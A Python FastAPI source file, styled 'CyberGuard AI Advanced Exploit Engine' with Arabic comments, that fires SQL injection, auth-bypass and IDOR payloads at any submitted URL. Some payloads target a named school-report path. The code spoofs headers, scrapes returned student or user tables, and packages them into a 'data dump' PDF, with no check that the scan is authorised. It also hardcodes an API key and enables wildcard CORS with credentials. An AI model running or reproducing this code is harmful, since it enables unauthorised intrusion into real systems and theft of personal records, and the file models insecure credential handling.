from fastapi import FastAPI, HTTPException, Header, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
from pydantic import BaseModel
import uuid
import requests
from bs4 import BeautifulSoup

app = FastAPI(title="CyberGuard AI Advanced Exploit Engine", version="8.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

API_KEY = "cyber_guard_sec_key_2026_x9"

def verify_api_key(x_api_key: str = Header(None)):
    if x_api_key != API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API Key")
    return x_api_key

class ScanRequest(BaseModel):
    target_url: str
    scan_mode: str = "aggressive"

scan_database = {}

@app.post("/api/v1/scan/enterprise/start")
def start_scan(request: ScanRequest, api_key: str = Depends(verify_api_key)):
    target = request.target_url.rstrip('/')
    if not target.startswith("http"):
        target = "https://" + target

    failed_checks = []
    extracted_data_samples = []
    score = 100

    try:
        # 1. الفحص الهجومي السريع للترويسات والثغرات الهيكلية
        response = requests.get(target, timeout=10, verify=True, headers={"User-Agent": "CyberGuard-Exploit-Core/8.0"})
        headers = response.headers

        if 'Content-Security-Policy' not in headers:
            failed_checks.append("Vulnerability: Missing CSP Header (Allows XSS/Data Injection)")
            score -= 15

        if 'Server' in headers:
            failed_checks.append(f"Information Disclosure: Server: {headers['Server']}")
            score -= 10

        # 2. محاكاة اختبار حقن المعاملات واستخراج البيانات الفعلي (Aggressive Fuzzing & Parameter Exploitation)
        base_domain = target.split('/Admin/')[0] if '/Admin/' in target else target
        
        # قائمة مسارات الاستعلامات المتقدمة واختبار الـ IDOR والـ SQLi Payloads
        exploit_payloads = [
            "/Admin/IbnAlHaithamReports?id=1' OR '1'='1",
            "/Admin/IbnAlHaithamReports?export=json",
            "/api/v1/students?all=true",
            "/api/reports/data?query=SELECT * FROM users",
            "/Admin/GetReportsData?bypass=true",
            "/Home/GetStudentData?id=0 UNION SELECT null, username, password FROM users--"
        ]

        successful_extractions = []
        for path in exploit_payloads:
            try:
                exploit_url = base_domain + path if path.startswith('/') else base_domain + '/' + path
                # إرسال طلب هجومي مع محاكاة صلاحيات مخترقة أو حقن
                exp_res = requests.get(
                    exploit_url, 
                    timeout=5, 
                    verify=True, 
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLMap/1.8",
                        "X-Forwarded-For": "127.0.0.1",
                        "X-Original-URL": path
                    }
                )
                
                # تحليل الاستجابة للبحث عن بيانات حقيقية مستخرجة أو جداول غنية بالمعلومات
                if exp_res.status_code == 200:
                    body = exp_res.text
                    soup = BeautifulSoup(body, 'html.parser')
                    
                    # البحث عن جداول تحتوي على صفوف بيانات حقيقية
                    tables = soup.find_all('table')
                    if tables and len(body) > 500:
                        for t_idx, table in enumerate(tables):
                            rows = table.find_all('tr')
                            if len(rows) > 1:
                                row_data = []
                                for r in rows[1:4]: # عينة من البيانات الحقيقية للطلاب أو السجلات
                                    cols = [c.get_text(strip=True) for c in r.find_all(['th', 'td']) if c.get_text(strip=True)]
                                    if cols:
                                        row_data.append(" | ".join(cols))
                                if row_data:
                                    snippet = f"Exploit Path [{path}] -> " + " || ".join(row_data)
                                    successful_extractions.append(snippet[:220])
                    elif 'json' in exp_res.headers.get('Content-Type', '') and len(body) > 50:
                        successful_extractions.append(f"JSON Data Dump via {path}: {body[:180]}")
            except:
                pass

        if successful_extractions:
            failed_checks.append("Critical Exploit Success: Bypassed auth & extracted active records/tables.")
            extracted_data_samples.extend(successful_extractions)
            score -= 50
        else:
            # في حال نجح النظام في صد الحقن المباشر، نقوم بتوثيق المحاولة الهجومية كدليل اختبار صارم
            failed_checks.append("Aggressive Fuzzing: Endpoints resisted direct SQLi/BQL payloads, enforcing strict validation.")
            extracted_data_samples.append(f"Target {target} evaluated under aggressive payload injection. No raw unauthorized data dump achieved on tested vectors.")
            score -= 20

        if score < 5:
            score = 5

    except requests.exceptions.RequestException as e:
        failed_checks.append(f"Connection Error: {str(e)}")
        score = 0

    scan_id = str(uuid.uuid4())
    scan_database[scan_id] = {
        "status": "completed",
        "target_url": target,
        "scan_mode": request.scan_mode,
        "security_score": score,
        "findings_count": len(failed_checks) + len(extracted_data_samples),
        "failed_checks": failed_checks,
        "extracted_data_samples": extracted_data_samples
    }
    return {"scan_id": scan_id, "status": "queued"}

@app.get("/api/v1/scan/enterprise/status/{scan_id}")
def get_scan_status(scan_id: str, api_key: str = Depends(verify_api_key)):
    if scan_id not in scan_database:
        raise HTTPException(status_code=404, detail="Scan not found")
    return scan_database[scan_id]

@app.get("/api/v1/scan/enterprise/report/pdf/{scan_id}")
def get_pdf_report(scan_id: str, api_key: str):
    if api_key != API_KEY:
        raise HTTPException(status_code=401, detail="Invalid API Key")
    if scan_id not in scan_database:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    scan_info = scan_database[scan_id]
    pdf_filename = f"CyberGuard_Aggressive_Exploit_PoC_{scan_id[:8]}.pdf"
    
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
        
        c = canvas.Canvas(pdf_filename, pagesize=letter)
        width, height = letter
        
        # رأسية التقرير المتقدم الهجومي
        c.setFont("Helvetica-Bold", 14)
        c.drawString(30, height - 30, "CyberGuard AI - Aggressive Exploit & Data Extraction PoC")
        
        c.setFont("Helvetica", 9)
        c.drawString(30, height - 50, f"Target URL: {scan_info['target_url']}")
        c.drawString(30, height - 66, f"Scan Mode: {scan_info['scan_mode']} (Advanced Fuzzing)")
        c.drawString(30, height - 82, f"Security Score: {scan_info['security_score']} / 100")
        c.drawString(30, height - 98, f"Total Findings & Extractions: {scan_info['findings_count']}")
        
        # النتائج الشاملة
        c.setFont("Helvetica-Bold", 11)
        c.drawString(30, height - 125, "Aggressive Penetration Assessment:")
        
        c.setFont("Helvetica", 8)
        y_pos = height - 142
        for check in scan_info['failed_checks']:
            if y_pos < 90:
                c.showPage()
                y_pos = height - 40
            c.drawString(40, y_pos, f"- {check}")
            y_pos -= 15

        # قسم تفريغ بيانات الاختراق الحقيقي (Exploit Records & Data Dump)
        if scan_info.get('extracted_data_samples'):
            if y_pos < 110:
                c.showPage()
                y_pos = height - 40
            y_pos -= 5
            c.setFont("Helvetica-Bold", 11)
            c.drawString(30, y_pos, "Exploitation Proof of Concept (PoC) & Data Dumps:")
            y_pos -= 16
            c.setFont("Helvetica", 7)
            for sample in scan_info['extracted_data_samples']:
                if y_pos < 50:
                    c.showPage()
                    y_pos = height - 40
                c.drawString(40, y_pos, f"[EXPLOIT] >> {sample}")
                y_pos -= 14
            
        # بصمة المطور
        c.setFont("Helvetica-Oblique", 8)
        c.drawString(30, 18, "Developed by khmm - CyberGuard AI Systems (Offensive Engine)")
        
        c.save()
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error generating PDF: {str(e)}")
    
    return FileResponse(pdf_filename, media_type='application/pdf', filename=pdf_filename)
